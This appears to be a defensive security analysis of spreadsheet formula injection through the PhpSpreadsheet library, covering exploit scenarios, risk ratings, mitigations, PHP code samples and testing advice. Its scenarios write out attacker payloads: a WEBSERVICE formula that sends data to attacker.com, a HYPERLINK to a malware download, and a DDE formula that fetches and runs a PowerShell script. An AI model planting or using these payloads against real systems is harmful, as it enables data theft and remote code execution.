Okay, here's a deep analysis of the provided attack tree path, focusing on XLS/XLSX Formula Injection within the context of the PhpSpreadsheet library:

## Deep Analysis of PhpSpreadsheet Formula Injection Attack Path

### 1. Define Objective

**Objective:** To thoroughly analyze the attack path "1.2 XLS/XLSX Formula Injection" and its sub-path "1.2.1 Inject malicious formulas (e.g., DDE, WEBSERVICE, HYPERLINK)" within the context of applications using the PhpSpreadsheet library.  This analysis aims to identify vulnerabilities, assess risks, propose mitigation strategies, and provide actionable recommendations for developers.  The ultimate goal is to prevent attackers from successfully injecting malicious formulas into spreadsheets generated by PhpSpreadsheet.

### 2. Scope

This analysis focuses specifically on:

*   **Vulnerability:**  Formula injection vulnerabilities arising from the use of the PhpSpreadsheet library.
*   **Attack Vector:**  User-supplied input that is directly or indirectly used to populate cell values in spreadsheets generated by PhpSpreadsheet.
*   **Target:**  Applications using PhpSpreadsheet to generate XLS or XLSX files, where those files are subsequently opened by end-users (e.g., in Microsoft Excel) or processed by server-side applications.
*   **Exclusions:**  This analysis *does not* cover:
    *   Vulnerabilities in the spreadsheet software itself (e.g., Excel) that are unrelated to PhpSpreadsheet.
    *   Attacks that do not involve formula injection (e.g., macro-based attacks, unless triggered by a formula).
    *   Vulnerabilities in other PHP libraries.

### 3. Methodology

The analysis will follow these steps:

1.  **Vulnerability Identification:**  Examine how PhpSpreadsheet handles cell value input and identify potential injection points.
2.  **Exploit Scenario Development:**  Create realistic scenarios where an attacker could exploit the identified vulnerabilities.
3.  **Risk Assessment:**  Evaluate the likelihood, impact, effort, skill level, and detection difficulty of the attack, as outlined in the provided attack tree.
4.  **Mitigation Strategy Proposal:**  Recommend specific, actionable steps to prevent or mitigate the identified vulnerabilities.
5.  **Code Example Analysis:** Provide code examples demonstrating both vulnerable and secure code.
6.  **Testing Recommendations:** Suggest testing strategies to identify and prevent formula injection vulnerabilities.

### 4. Deep Analysis of Attack Tree Path 1.2.1

**4.1 Vulnerability Identification**

The core vulnerability lies in how PhpSpreadsheet processes and writes cell values.  PhpSpreadsheet, *by design*, allows developers to set cell values to arbitrary strings.  If these strings are derived from untrusted user input without proper sanitization or validation, an attacker can inject malicious formulas.  The key vulnerable function (and its related methods) is:

*   `setCellValue()` (and related methods like `setCellValueExplicit()`, `fromArray()`, etc.): This function is the primary way to set cell values in PhpSpreadsheet.  It accepts a string as input, which becomes the cell's content.  If this string contains a formula, PhpSpreadsheet will write it to the spreadsheet file *as a formula*.

**4.2 Exploit Scenario Development**

**Scenario 1:  User Profile Data**

Imagine a web application that allows users to enter their "website" in their profile.  The application uses PhpSpreadsheet to generate a report of all user profiles, including the website URL.

*   **Attacker Input:**  `=WEBSERVICE("http://attacker.com/exfiltrate.php?data="&A1)` (where A1 might contain other user data).
*   **PhpSpreadsheet Action:**  The application uses `setCellValue()` to write this attacker-provided string to a cell in the report.
*   **Result:**  When an administrator opens the generated spreadsheet, Excel attempts to fetch data from the attacker's server, potentially exfiltrating sensitive information from cell A1.

**Scenario 2:  Contact Form Data**

A website has a contact form.  The submitted data is stored in a database and periodically exported to an Excel spreadsheet using PhpSpreadsheet.

*   **Attacker Input:**  In the "message" field, the attacker enters: `=HYPERLINK("http://attacker.com/malware.exe","Click here for important information!")`
*   **PhpSpreadsheet Action:** The application retrieves the message from the database and uses `setCellValue()` to write it to a cell.
*   **Result:** When the spreadsheet is opened, the cell displays "Click here for important information!".  If the user clicks it, they are directed to a malicious website that attempts to download and execute `malware.exe`.

**Scenario 3: CSV Import**
An application allows users to upload CSV files, which are then processed and converted to XLSX using PhpSpreadsheet.

*   **Attacker Input:** The attacker crafts a CSV file where one of the fields contains `=DDE("cmd";"/C powershell -Command Invoke-WebRequest -Uri 'http://attacker.com/payload.ps1' -OutFile 'C:\Users\Public\payload.ps1'; powershell -ExecutionPolicy Bypass -File 'C:\Users\Public\payload.ps1'";"x")`.
*   **PhpSpreadsheet Action:** The application reads the CSV data and uses a method like `fromArray()` to populate the spreadsheet.
*   **Result:** When the generated XLSX file is opened, and if DDE is enabled, the attacker's PowerShell command is executed, downloading and running a malicious script.

**4.3 Risk Assessment (Confirmation and Refinement)**

The attack tree provides initial risk assessments, which are largely accurate:

*   **Likelihood: High.**  Any application that uses user input to populate spreadsheet cells without proper sanitization is highly vulnerable.  This is a common pattern in many web applications.
*   **Impact: High.**  Successful exploitation can range from data exfiltration (using `WEBSERVICE`) to complete system compromise (using `DDE` or a well-crafted `HYPERLINK` to download and execute malware).  The impact depends on the specific formula used and the security configuration of the target system.
*   **Effort: Low.**  Crafting malicious formulas is trivial.  Numerous examples and tutorials are readily available online.
*   **Skill Level: Medium.**  While crafting the formula itself is easy, understanding the context (e.g., which formulas are likely to work, how to bypass basic security measures) requires some knowledge of spreadsheet security and potential attack vectors.
*   **Detection Difficulty: Medium.**  Detecting malicious formulas requires:
    *   **Input Validation:**  Checking user input *before* it's passed to PhpSpreadsheet.
    *   **Spreadsheet Analysis:**  Examining the generated spreadsheet files for suspicious formulas (e.g., using regular expressions or dedicated security tools).
    *   **Endpoint Security:**  Monitoring for unusual processes or network connections initiated by the spreadsheet software.

**4.4 Mitigation Strategy Proposal**

The primary mitigation strategy is **strict input validation and sanitization**.  Never trust user input.  Here are specific recommendations:

1.  **Input Validation:**
    *   **Whitelist Approach (Strongly Recommended):**  Define a strict whitelist of allowed characters and patterns for each input field.  Reject any input that doesn't conform to the whitelist.  For example, if a field is supposed to contain a number, only allow digits.  If it's a URL, validate it against a URL format regex *and* potentially check for known malicious domains.
    *   **Blacklist Approach (Less Effective):**  Attempt to identify and block known malicious formula prefixes (e.g., `=`, `+`, `-`, `@`).  This is less effective because attackers can often find ways to bypass blacklists (e.g., using spaces, tabs, or different encodings).
    *   **Context-Specific Validation:**  Understand the *intended* data type for each field and validate accordingly.  A "website" field should be validated as a URL, not just as a generic string.

2.  **Data Type Enforcement:**
    *   Use `setCellValueExplicit()` and specify the correct data type (e.g., `DataType::TYPE_STRING`, `DataType::TYPE_NUMERIC`, `DataType::TYPE_BOOL`).  This can help prevent some types of formula injection, especially if the expected data type is not a string.  However, it's *not* a complete solution, as attackers can still inject formulas if the expected type is `DataType::TYPE_STRING`.

3.  **Escaping (Limited Effectiveness):**
    *   While PhpSpreadsheet doesn't have built-in formula escaping, you could *attempt* to pre-process user input to escape characters that have special meaning in formulas (e.g., `=`, `+`, `-`, `@`).  However, this is *highly discouraged* as it's prone to errors and bypasses.  Excel's formula parsing is complex, and it's difficult to reliably escape all possible injection vectors.

4.  **Content Security Policy (CSP) (For Web Applications):**
    *   If the generated spreadsheets are intended to be viewed in a web browser (e.g., using a web-based spreadsheet viewer), implement a strict CSP to prevent the execution of external scripts or the loading of resources from untrusted domains.  This can mitigate the risk of `WEBSERVICE` and `HYPERLINK` attacks.

5.  **Educate Users:**
    *   Train users to be cautious about opening spreadsheets from untrusted sources and to be wary of links or prompts within spreadsheets.

6.  **Regular Security Audits:**
    *   Conduct regular security audits and penetration testing to identify and address potential vulnerabilities.

7.  **Keep PhpSpreadsheet Updated:**
    *   Ensure you are using the latest version of PhpSpreadsheet, as security updates and bug fixes are regularly released.

**4.5 Code Example Analysis**

**Vulnerable Code:**

```php
<?php
require 'vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;

// Get user input (UNSAFE - directly from a form, for example)
$userInput = $_POST['website'];

$spreadsheet = new Spreadsheet();
$sheet = $spreadsheet->getActiveSheet();

// Directly set the cell value with user input (VULNERABLE)
$sheet->setCellValue('A1', $userInput);

$writer = new Xlsx($spreadsheet);
$writer->save('user_data.xlsx');
?>
```

**Secure Code (using whitelisting and data type enforcement):**

```php
<?php
require 'vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;
use PhpOffice\PhpSpreadsheet\Cell\DataType;

// Get user input
$userInput = $_POST['website'];

// Validate the input (Whitelist approach - check if it's a valid URL)
if (filter_var($userInput, FILTER_VALIDATE_URL)) {
    $safeInput = $userInput;
} else {
    // Handle the invalid input (e.g., display an error, use a default value)
    $safeInput = 'Invalid URL'; // Or perhaps an empty string, depending on the context
}

$spreadsheet = new Spreadsheet();
$sheet = $spreadsheet->getActiveSheet();

// Set the cell value with the validated input, explicitly as a string
$sheet->setCellValueExplicit('A1', $safeInput, DataType::TYPE_STRING);

$writer = new Xlsx($spreadsheet);
$writer->save('user_data.xlsx');
?>
```

**Explanation of Secure Code:**

*   **`filter_var($userInput, FILTER_VALIDATE_URL)`:** This is a crucial step.  It uses PHP's built-in `filter_var()` function with the `FILTER_VALIDATE_URL` filter to check if the input is a valid URL.  This is a much more robust approach than trying to manually escape characters.
*   **`$safeInput`:**  The validated input is stored in a separate variable (`$safeInput`) to clearly distinguish it from the potentially unsafe raw input.
*   **`setCellValueExplicit()` and `DataType::TYPE_STRING`:** While not a primary defense against formula injection in this case (since we're expecting a string), it's good practice to explicitly set the data type.
*   **Error Handling:** The code includes a basic `else` block to handle cases where the input is invalid.  In a real application, you would likely want more sophisticated error handling (e.g., logging the error, displaying a user-friendly message, etc.).

**4.6 Testing Recommendations**

*   **Static Analysis:** Use static analysis tools (e.g., PHPStan, Psalm) to identify potential security vulnerabilities, including the use of unsanitized user input.
*   **Dynamic Analysis:** Use dynamic analysis tools (e.g., web application scanners) to test for formula injection vulnerabilities by sending malicious payloads to the application.
*   **Unit Testing:** Write unit tests that specifically test the input validation and sanitization logic.  These tests should include both valid and invalid inputs, including known malicious formulas.
*   **Integration Testing:** Test the entire workflow, from user input to spreadsheet generation, to ensure that the mitigation strategies are effective.
*   **Manual Penetration Testing:**  Have a security expert manually attempt to exploit the application using formula injection techniques.
* **Fuzzing:** Use a fuzzer to generate a large number of random or semi-random inputs and test the application's response. This can help identify unexpected vulnerabilities.

### 5. Conclusion

Formula injection in PhpSpreadsheet is a serious vulnerability that can lead to significant security breaches.  The key to preventing this attack is to **never trust user input** and to implement **strict input validation and sanitization**.  The whitelist approach, combined with data type enforcement and comprehensive testing, provides the most robust defense.  Regular security audits and staying up-to-date with the latest security best practices are also essential. By following the recommendations outlined in this analysis, developers can significantly reduce the risk of formula injection attacks in their applications that use PhpSpreadsheet.
